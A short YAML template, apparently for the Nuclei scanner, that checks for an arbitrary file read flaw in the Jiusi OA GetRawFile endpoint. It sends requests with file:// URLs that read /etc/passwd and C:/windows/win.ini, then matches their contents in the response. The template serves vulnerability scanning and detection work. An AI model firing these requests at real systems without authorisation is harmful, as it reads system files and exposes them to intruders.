id: jsoa-fileRead
info:
  author: Str1am
  name: "\u4E5D\u601DOA GetRawFile \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6"
  severity: medium
  tags: jsoa,fileRead
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    type: word
    words:
    - root:x
    - extensions
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/jsoa/GetRawFile?url=file:///C:/windows/win.ini'
  - '{{BaseURL}}/jsoa/GetRawFile?url=file:///etc/passwd'
